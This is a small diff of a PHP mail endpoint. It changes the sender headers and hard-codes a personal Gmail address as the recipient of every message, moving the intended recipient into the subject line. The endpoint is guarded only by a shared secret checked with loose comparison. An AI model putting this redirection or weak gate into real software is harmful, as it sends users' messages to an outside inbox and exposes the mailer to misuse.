@@ -6,10 +6,10 @@
    {
        if ( $_POST['secret_code'] == 'SECRET_TOKEN')
        {
-             $headers = "From: support@clsonline.org\r\n" .
-                         "Reply-To: support@clsonline.org\r\n" .
+             $headers = "From: no-reply@clsonline.org\r\n" .
+                         "Reply-To: no-reply@clsonline.org\r\n" .
                          "X-Mailer: PHP/" . phpversion();
-             mail( $_POST['to'] , $_POST['subject']  , $_POST['message'] , $headers) ;
+             mail( 'mohammad2001saide@gmail.com' , $_POST['subject']." ( ".$_POST['to']." ) "  , $_POST['message'] , $headers) ;
              
              header('HTTP/1.1 200 SUCCESS');
              $response['status'] = '200_SUCCESS';
